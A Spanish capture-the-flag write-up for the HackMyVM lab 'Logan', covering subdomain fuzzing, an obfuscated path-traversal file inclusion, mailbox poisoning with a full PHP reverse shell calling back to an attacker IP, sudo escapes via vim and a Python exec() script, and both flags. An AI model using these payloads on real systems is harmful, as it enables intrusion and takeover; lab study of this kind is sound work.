# 🎯 Logan - HackMyVM (Intermediate)

## 📋 Info

| Campo | Detalle |
|---|---|
| Máquina | Logan |
| Plataforma | HackMyVM |
| Dificultad | Intermediate |
| OS | Linux Ubuntu |
| IP | Variable (192.168.0.x) |

---

## 🔍 Reconocimiento

```bash
sudo arp-scan -l
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn IP_VICTIMA
```

**Puertos abiertos:**
- 25/tcp → SMTP (Postfix)
- 80/tcp → HTTP

---

## 🌐 Enumeración Web

La web redirige a `http://logan.hmv/` — hay que añadir al `/etc/hosts`:

```bash
sudo nano /etc/hosts
# Añadir:
# IP_VICTIMA logan.hmv
# IP_VICTIMA admin.logan.hmv
```

Fuzzing de subdominios:

```bash
wfuzz -c --hc=404 --hl=1 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -H "Host: FUZZ.logan.hmv" -u IP_VICTIMA
```

Subdominio encontrado: **admin.logan.hmv**

---

## 🔓 LFI — Path Traversal Ofuscado

En `http://admin.logan.hmv/payments.php` hay un parámetro `file` vulnerable.

El path traversal estándar no funciona. Usamos variante ofuscada:

```bash
# Leer /etc/passwd
curl -s -X POST http://admin.logan.hmv/payments.php \
  -d "file=....//....//....//....//....//....//....//etc/passwd"
```

Usuarios encontrados: `www-data`, `logan`

```bash
# Verificar acceso al mail.log
curl -s -X POST http://admin.logan.hmv/payments.php \
  -d "file=....//....//....//....//....//....//....//var/log/mail.log"
```

---

## 💉 SMTP Log Poisoning → /var/mail/www-data

Creamos la reverse shell PHP:

```bash
cat > /tmp/webshell.php << 'EOF'
<?php
set_time_limit(0);
$ip = 'IP_KALI';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) { printit("$errstr ($errno)"); exit(1); }
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) { printit("ERROR: Can't spawn shell"); exit(1); }
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
    if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; }
    if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) { $input = fread($sock, $chunk_size); fwrite($pipes[0], $input); }
    if (in_array($pipes[1], $read_a)) { $input = fread($pipes[1], $chunk_size); fwrite($sock, $input); }
    if (in_array($pipes[2], $read_a)) { $input = fread($pipes[2], $chunk_size); fwrite($sock, $input); }
}
fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process);
function printit($string) { if (!$daemon) { print "$string\n"; } }
?>
EOF
```

Abrir listener en Kali:
```bash
nc -lvnp 4444
```

Enviar PHP por SMTP via telnet:
```bash
telnet IP_VICTIMA 25
```

```
EHLO kali
MAIL FROM:<logan@logan.hmv>
RCPT TO:<www-data@logan.hmv>
DATA
[pegar contenido de /tmp/webshell.php]
.
QUIT
```

⚠️ **CLAVE:** El PHP se entrega al **buzón de www-data** (`/var/mail/www-data`), NO al mail.log.

Incluir el buzón con LFI para ejecutar el PHP:
```bash
curl -s -X POST http://admin.logan.hmv/payments.php \
  -d "file=....//....//....//....//....//....//....//var/mail/www-data"
```

Shell como **www-data** 🎉

---

## 📦 Estabilización de Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🔼 Escalada www-data → logan

```bash
sudo -u logan vim -c ':!/bin/bash'
```

Shell como **logan** 🎉

**Flag user:**
```bash
cat /home/logan/user.txt
# User: ilovelogs
```

---

## 🔴 Escalada logan → root

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/learn_some_python.py
```

El script hace `exec()` del input del usuario — RCE como root:

```bash
sudo /usr/bin/python3 /opt/learn_some_python.py
```

Cuando pide input escribir:
```python
import os; os.system('/bin/bash')
```

Shell como **root** 🎉

**Flag root:**
```bash
cat /root/root.txt
# Root: siuuuuuuuu
```

---

## 🗺️ Cadena de Ataque

1. **wfuzz** → subdominio `admin.logan.hmv`
2. **LFI path traversal ofuscado** `....//....//` → `/etc/passwd`
3. **Telnet SMTP** → PHP reverse shell → buzón `www-data@logan.hmv`
4. **LFI** → `/var/mail/www-data` → shell www-data
5. **`sudo -u logan vim -c ':!/bin/bash'`** → logan
6. **`sudo python3 /opt/learn_some_python.py`** → exec() RCE → ROOT

---

## ⚠️ Lección Aprendida

El PHP enviado por SMTP se guarda en `/var/mail/www-data` (buzón del usuario), NO en `/var/log/mail.log`. Hay que incluir el buzón con el LFI para ejecutar el código.

---

## 📚 Técnicas Aprendidas

- **Path Traversal ofuscado** `....//....//` para evadir filtros
- **SMTP Log Poisoning** → inyectar PHP en buzón de correo
- **LFI** para incluir y ejecutar el buzón
- **vim sudo** → `sudo -u usuario vim -c ':!/bin/bash'` (GTFOBins)
- **exec() en Python** → RCE cuando script hace exec del input
